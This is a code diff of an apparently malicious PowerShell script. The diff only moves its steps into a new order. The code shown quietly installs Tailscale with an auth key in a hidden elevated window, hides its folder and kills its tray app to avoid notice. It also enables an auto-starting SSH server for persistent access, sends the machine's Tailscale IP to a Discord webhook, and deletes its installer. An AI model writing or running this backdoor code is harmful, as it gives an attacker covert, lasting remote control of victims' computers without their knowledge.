@@ -84,6 +84,18 @@ Start-Sleep 1
 Start-Process -FilePath "C:\Tailscale\tailscale.exe" -windowstyle hidden -Verb RunAs -ArgumentList "up --authkey $authKey --unattended"
 Start-Sleep 1
 
+## Finish Tailscale installation
+Get-Item "C:\tailscale" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
+taskkill /im "tailscale-ipn.exe" /F
+
+## Enable persistent SSH
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+Start-Service sshd
+Set-Service -Name sshd -StartupType 'Automatic'
+Get-NetFirewallRule -Name *ssh*
+
+Start-Sleep 5
+
 ## Sends Discord Webhook
 $ip = (Get-NetIPAddress -AddressFamily IPv4 -AddressState Preferred -InterfaceAlias "Tailscale").IPAddress 
 
@@ -104,16 +116,6 @@ $payload = @{
 }
 
 Invoke-RestMethod -Uri $Webhook -Method Post -Body $payload;
-
-## Enable persistent SSH
-Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
-Start-Service sshd
-Set-Service -Name sshd -StartupType 'Automatic'
-Get-NetFirewallRule -Name *ssh*
-
-## Finish Tailscale installation
-Get-Item "C:\tailscale" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
-taskkill /im "tailscale-ipn.exe" /F
 
 ## Self Delete
 Remove-Item "C:/file.msi"
